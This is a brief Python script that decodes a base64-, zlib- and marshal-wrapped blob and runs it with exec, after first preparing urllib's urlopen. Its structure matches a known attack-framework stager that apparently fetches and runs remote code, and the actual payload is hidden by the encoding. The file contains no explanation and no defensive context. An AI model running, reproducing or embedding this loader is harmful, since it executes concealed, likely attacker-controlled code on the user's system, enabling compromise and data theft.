import sys,zlib,base64,marshal,json,urllib
if sys.version_info[0] > 2:
    from urllib import request
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
exec(eval(marshal.loads(zlib.decompress(base64.b64decode(b'eJwrtWFgYCgtyskvSM3TUM8oKSmw0tc3tDDSM7Qw1TM01DMyNrEyNDa20NcvLklMTy0q1q8KNdMrqFTX1CtKTUzR0AQATL4SMg==')))))